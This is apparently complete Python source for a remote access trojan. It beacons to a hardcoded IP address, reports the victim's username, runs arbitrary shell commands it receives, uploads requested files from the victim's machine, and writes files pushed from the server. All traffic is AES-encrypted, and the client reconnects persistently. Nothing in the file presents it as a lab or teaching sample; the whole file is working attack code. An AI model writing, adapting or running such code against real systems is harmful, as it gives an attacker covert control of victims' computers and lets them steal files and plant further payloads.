import os
from os import popen
import socket
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

user = os.popen('whoami').read()
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
CONN = True

def enc_mes(mes, key):
    try:
        cipher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        block_size = 16
        if type(mes) != bytes:
            mes = mes.encode()
        return cipher.encrypt(pad(mes, block_size))
    except:
        return None

def dec_file_mes(mes, key):
    cipher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
    block_size = 16
    s = cipher.decrypt(mes)
    return unpad(s, block_size)

def dec_mes(mes, key):
    if mes == b'':
        return mes
    try:
        cipher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        block_size = 16
        v = cipher.decrypt(mes)
        return unpad(v, block_size)
    except:
        return "echo Try it again"

def receive_file():
    try:
        client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client2.connect(('13.61.7.218', 54163))

        k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
        client2.send(k.encode())

        enc_received = client2.recv(BUFFER_SIZE)
        received = dec_mes(enc_received, k).decode()
        filename, filesize = received.split(SEPARATOR)

        ok_enc = enc_mes("ok2", k)
        client2.send(ok_enc)

        total_bytes = 0
        msg = b''
        while total_bytes < int(filesize):
            bytes_read = client2.recv(BUFFER_SIZE)
            msg += bytes_read
            total_bytes += len(bytes_read)

        decr_file = dec_mes(msg, k)

        with open(filename, 'wb') as f:
            f.write(decr_file)
        client2.close()
    except Exception:
        client2.send("Error transporting file".encode())

def receive(client, k):
    while True:
        try:
            msg = client.recv(1024)
            msg = dec_mes(msg, k)
            message = msg.decode() if msg != b'' else None

            if message == "check":
                enc_answ = enc_mes("check-ok", k)
                client.send(enc_answ)

            elif message == "send_file":
                threading.Thread(target=receive_file).start()

            elif message == "get_file":
                client.send(enc_mes("ok", k))
                path_to_file = client.recv(1024)
                path_to_file = dec_mes(path_to_file, k)

                with open(path_to_file, 'rb') as f:
                    bytes_read = f.read()
                bytes_enc = enc_mes(bytes_read, k)
                filesize = enc_mes(str(len(bytes_enc)), k)
                client.send(filesize)

                ch = client.recv(1024).decode()
                if ch == "ok":
                    client.sendall(bytes_enc)

            elif message and message != "\n":
                try:
                    answer = os.popen(message).read()
                    if answer.encode() == b'':
                        client.send("Bad command!".encode('ascii'))
                    else:
                        enc_answer = enc_mes(answer, k)
                        size = str(len(enc_answer))
                        client.send(size.encode())

                        ch = client.recv(1024).decode()
                        if ch == "ok":
                            client.sendall(enc_answer)
                except:
                    client.send("Bad command!".encode('ascii'))

        except Exception:
            time.sleep(60)
            try:
                client.close()
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect(('13.61.7.218', 55155))
                k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
                client.send(f"{user}{SEPARATOR}{k}".encode())
                client.settimeout(600)
            except:
                time.sleep(60)

if __name__ == "__main__":
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('13.61.7.218', 55155))
            k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
            client.send(f"{user}{SEPARATOR}{k}".encode())
            client.settimeout(600)

            receive_thread = threading.Thread(target=receive, args=(client, k))
            receive_thread.start()
            break
        except:
            time.sleep(50)
